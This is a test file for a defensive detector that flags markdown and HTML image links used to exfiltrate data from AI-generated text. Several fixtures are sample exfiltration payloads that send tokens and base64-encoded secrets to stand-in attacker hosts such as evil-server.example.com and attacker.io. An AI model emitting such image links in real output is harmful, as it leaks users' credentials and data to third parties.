import { describe, expect, it } from "vitest";
import { detectMarkdownExfiltration } from "./markdownExfiltration";

describe("detectMarkdownExfiltration", () => {
  it("detects markdown image containing sensitive query parameters", () => {
    const malicious = `
      Thank you for the conversation.
      ![status](https://evil-server.example.com/beacon.png?token=ghp_supersecret1234567890)
    `;

    const findings = detectMarkdownExfiltration(malicious);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.rule).toBe("EXF001");
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.hostname).toBe("evil-server.example.com");
    expect(findings[0]?.suspiciousReason).toContain("token");
  });

  it("detects HTML img tags used for covert data leaking", () => {
    const maliciousHtml = `
      Summary ready: <img src="https://attacker.io/leak?data=c2VjcmV0X3Bhc3N3b3JkXzEyMzQ1Njc4" alt="logo" />
    `;

    const findings = detectMarkdownExfiltration(maliciousHtml);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.rule).toBe("EXF001");
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.hostname).toBe("attacker.io");
  });

  it("allows benign static images from allowlisted domains", () => {
    const benign = `
      Here is the chart you requested:
      ![analytics](https://cdn.internal-company.com/assets/report.png)
      ![logo](https://trusted-cdn.com/logo.svg)
    `;

    const findings = detectMarkdownExfiltration(benign, {
      allowedHostnames: ["cdn.internal-company.com", "trusted-cdn.com"],
    });
    expect(findings).toHaveLength(0);
  });

  it("permits clean static assets without query strings by default", () => {
    const text = "Check this diagram: ![diagram](https://images.unsplash.com/photo-123.jpg)";
    const findings = detectMarkdownExfiltration(text);
    expect(findings).toHaveLength(0);
  });

  it("flags untrusted hosts when allowCleanStaticAssets is false", () => {
    const text = "Check this diagram: ![diagram](https://unknown-host.net/photo.jpg)";
    const findings = detectMarkdownExfiltration(text, { allowCleanStaticAssets: false });
    expect(findings).toHaveLength(1);
    expect(findings[0]?.suspiciousReason).toContain("without domain authorization");
  });

  it("catches base64 encoded data strings embedded in the URL path", () => {
    const text = "![render](https://drop.attacker.com/collect/eyJ1c2VySWQiOiAiYWRtaW4iLCAidG9rZW4iOiAiMTIzNCJ9)";
    const findings = detectMarkdownExfiltration(text);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("critical");
  });
});
